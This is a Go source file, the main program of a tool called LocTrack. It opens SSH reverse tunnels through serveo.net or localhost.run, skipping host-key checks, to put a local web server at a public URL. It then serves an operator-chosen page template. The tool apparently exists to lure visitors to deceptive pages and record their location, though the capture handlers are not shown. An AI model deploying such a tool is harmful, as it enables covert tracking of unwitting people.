package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"reflect"
	"regexp"
	"strconv"
	"syscall"
	"time"

	. "github.com/cipheras/gohelper"
	"github.com/cipheras/loctrack/handler"
)

var (
	// arguments
	mantunnel = flag.Bool("m", false, "Manual Tunnel")
	tls       = flag.Bool("c", false, "For your own certificates located in cert folder")
	subdomain = flag.String("d", "", "Subdomain")
	port      = flag.Int("p", 8080, "Port Number")
)
var url string

const (
	// VERSION ...
	VERSION = "v1.5.1"
)

func main() {
	flag.Usage = func() {
		Cprint(I, "Choose options. By default a tunnel will be created itself")
		Cprint(I, "Put binary file in the same dir with static files")
		Cprint(I, "Run your own tunnel by using "+GREEN+"'-m'"+BLUE+" flag")
		Cprint(I, "Manual TLS certificate using "+GREEN+"'-c'"+BLUE+" flag. Keep your own certs in "+GREEN+"'cert'"+BLUE+" folder")
		fmt.Println("\n" + GREEN + "##################################" + BLUE + "LocTrack" + GREEN + "##################################" + RESET)
		flag.PrintDefaults()
		fmt.Println(GREEN + "##################################" + BLUE + "LocTrack" + GREEN + "##################################\n" + RESET)
	}
	flag.Parse()

	err := Flog()
	Try(err, false, "creating logs")
	err = Cwindows()
	Try(err, false, "windows color support")
	interrupt()
	banner()
	checkUpdates()

	Cprint(I, "Try"+GREEN+" loctrack -h "+BLUE+"for help and other options")
	err = os.Chmod("ssh-key/rsa", 0700)
	Try(err, true, "changing rsa key file permission")
	if *mantunnel {
		Cprint(T, "You have chosen manual mode. Run your own tunnel.")
	} else {
		err := urlCreation()
		if err != nil {
			fmt.Printf("\n")
			Try(errors.New("cleaning & exiting"), true)
		}
	}
	server(templateSel())
}

func banner() {
	bnr := `
	██▓     ▒█████   ▄████▄  ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀ ` + PURPLE + `
	▓██▒    ▒██▒  ██▒▒██▀ ▀█  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
	▒██░    ▒██░  ██▒▒▓█    ▄ ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ` + GREEN + `
	▒██░    ▒██   ██░▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
	░██████▒░ ████▓▒░▒ ▓███▀ ░  ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
	░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░  ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
	░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒       ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
	  ░ ░   ░ ░ ░ ▒  ░          ░        ░░   ░   ░   ▒   ░        ░ ░░ ░ 
		░  ░    ░ ░  ░ ░                  ░           ░  ░░ ░      ░  ░   
					 ░                                    ░               
	`
	crtr := `
	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+	
	|C| |i| |p| |h| |e| |r| |a| |s|
	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+
	`
	fmt.Print("\n", GREEN, bnr, RESET)
	fmt.Print(CYAN + "Created by:" + GREEN + crtr + RESET)
	fmt.Println(CYAN + "Version: " + RED + VERSION + RESET)
	time.Sleep(1200 * time.Millisecond)
}

func checkUpdates() {
	resp, err := http.Get("https://api.github.com/repos/cipheras/loctrack/releases")
	Try(err, false, "checking for updates")
	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	Try(err, false, "reading release info from api")
	var jsondata []map[string]interface{}
	err = json.Unmarshal(data, &jsondata)
	Try(err, false, "parsing json")
	version := jsondata[0]["tag_name"].(string)
	releasName := jsondata[0]["name"].(string)
	if version != VERSION {
		Cprint(I, "Update available..."+YELLOW+version+" ["+releasName+"]")
	}
}

func urlCreation() error {
	client := http.Client{
		Timeout: 5 * time.Second,
	}
	var stdout bytes.Buffer
	var cmd *exec.Cmd

	// Checking Serveo status
	fmt.Print(YELLOW + "\n" + CYAN + "[" + YELLOW + "*" + CYAN + "] " + YELLOW + "Checking service 1 status..." + RESET)
	sResp, err := client.Get("https://serveo.net")
	// time.Sleep(1 * time.Second)
	if err != nil {
		fmt.Println(RED + BLINK + BOLD + "Offline" + RESET)
		Try(errors.New("timeout for service 1"), false)
	} else {
		if sResp.StatusCode == 200 {
			Try(nil, false, "service 1 is online")
			sResp.Body.Close()
			fmt.Println(GREEN + BLINK + BOLD + "Online" + RESET)
			if *subdomain == "" {
				cmd = exec.Command("ssh", "-T", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-R", "80:localhost:"+strconv.Itoa(*port), "serveo.net")
			} else {
				cmd = exec.Command("ssh", "-T", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-R", *subdomain+":80:localhost:"+strconv.Itoa(*port), "serveo.net")
			}
			cmd.Stdin = os.Stdin
			cmd.Stdout = &stdout
			cmd.Start()
			Try(err, false, "running SSH")
			// defer cmd.Process.Kill()
			re, err := regexp.Compile(`https:\/\/.+serveo.*\.com`)
			Try(err, false, "finding URL")
			for i := 0; i < 5; i++ {
				url = re.FindString(stdout.String())
				if url != "" {
					Cprint(N, WHITE+"URL: "+GREEN+url)
					return nil
				}
				time.Sleep(1 * time.Second)
			}
			cmd.Process.Kill()
			Try(errors.New("fail 1"), false, "Failed to generate URL")
		} else {
			fmt.Println(RED + BGBLACK + BLINK + BOLD + "Offline" + RESET)
			Try(errors.New("Offline...service 1 down"), false)
		}
	}
	time.Sleep(1500 * time.Millisecond)

	// Checking localhost.run status
	fmt.Print(YELLOW + "\n" + CYAN + "[" + YELLOW + "*" + CYAN + "] " + YELLOW + "Checking service 2 status..." + RESET)
	lrResp, err := client.Get("http://localhost.run")
	// time.Sleep(1 * time.Second)
	if err != nil {
		fmt.Println(RED + BLINK + BOLD + "Offline" + RESET)
		Cprint(T, "Try again later...or report to the creator.")
		Try(errors.New("timeout for service 2"), false)
		return err
	}
	if lrResp.StatusCode == 200 {
		lrResp.Body.Close()
		fmt.Println(GREEN + BLINK + BOLD + "Online" + RESET)
		if *subdomain == "" {
			cmd = exec.Command("ssh", "-T", "-i", "ssh-key/rsa", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-R", "80:localhost:"+strconv.Itoa(*port), "ssh.localhost.run")
		} else {
			cmd = exec.Command("ssh", "-T", "-i", "ssh-key/rsa", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-R", "80:localhost:"+strconv.Itoa(*port), *subdomain+"@ssh.localhost.run")
		}
		cmd.Stdin = os.Stdin
		cmd.Stdout = &stdout
		// cmd.Stdout = os.Stdout
		// cmd.Stderr = os.Stderr
		err := cmd.Start()
		Try(err, true, "running SSH")
		// defer cmd.Process.Kill()
		re, err := regexp.Compile(`http.+localhost.run`)
		Try(err, true, "finding URL")
		for i := 0; i < 8; i++ {
			url = re.FindString(stdout.String())
			if url != "" {
				Cprint(N, WHITE+"URL: "+RESET+GREEN+url)
				return nil
			}
			time.Sleep(1 * time.Second)
		}
		cmd.Process.Kill()
		Cprint(E, "Failed to generate URL")
		Try(errors.New("Failed to generate URL2"), false)
		return errors.New("failed to generate url2")
	}
	fmt.Println(RED + BLINK + BOLD + "Offline" + RESET)
	Try(errors.New("Offline...service 2 is also down"), false)
	return errors.New("Both services offline")
}

func templateSel() string {
	type Template struct {
		Name    string
		Dir     string
		Handler string
	}
	type Templates struct {
		Templates []Template
	}

	templateInfo, err := os.Open("template/templates.json")
	Try(err, true, "reading templates")
	defer templateInfo.Close()
	data, err := ioutil.ReadAll(templateInfo)
	// var result map[string]interface{}
	var templates Templates
	json.Unmarshal(data, &templates)
Site:
	Cprint(T, "Select a template:")
	for i, v := range templates.Templates {
		fmt.Println(CYAN+"    ["+RESET, i+1, CYAN+"]"+RESET, v.Name)
	}
	fmt.Print(GREEN + "\n>> " + RESET)
	var choice int
	fmt.Scanln(&choice)
	numT := len(templates.Templates)
	if choice < 1 || numT < choice {
		Cprint(W, "Invaid option...try again")
		time.Sleep(1200 * time.Millisecond)
		fmt.Println(CLEAR) //clear console
		Cprint(N, WHITE+"URL: "+RESET+GREEN+url)
		goto Site
	}
	site := templates.Templates[choice-1].Name
	time.Sleep(500 * time.Millisecond)
	Cprint(N, "Loading template..."+UNDERLINE+site+RESET)
	return templates.Templates[choice-1].Handler //handlerfunction name from json file
}

func server(hndlr string) {
	time.Sleep(1 * time.Second)
	Cprint(N, "Starting server on port:"+RESET, *port)
	reflect.ValueOf(handler.Hndl(0)).MethodByName(hndlr).Call(nil)
	time.Sleep(500 * time.Millisecond)
	Cprint(I, "Press "+GREEN+"Ctrl-C"+BLUE+" to stop the server")
	if *tls {
		err := http.ListenAndServeTLS(":"+strconv.Itoa(*port), "cert/server.crt", "cert/server.key", nil) //with own TLS cert
		Try(err, true, "starting \"https\" server with SSL certificates")
		return
	}
	err := http.ListenAndServe(":"+strconv.Itoa(*port), nil) //with default cert
	Try(err, true, "starting \"http\" server")
}

func interrupt() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Print("\n" + CYAN + "[" + PURPLE + "*" + CYAN + "] " + PURPLE + "Aborting & Cleaning " + RESET)
		for i := 1; i <= 5; i++ {
			fmt.Print(PURPLE + "# " + RESET)
			time.Sleep(time.Millisecond * 200)
		}
		fmt.Print(CLEAR)
		Try(errors.New("\"ctrl+c\" by the client - aborting & cleaning"), true)
	}()
}
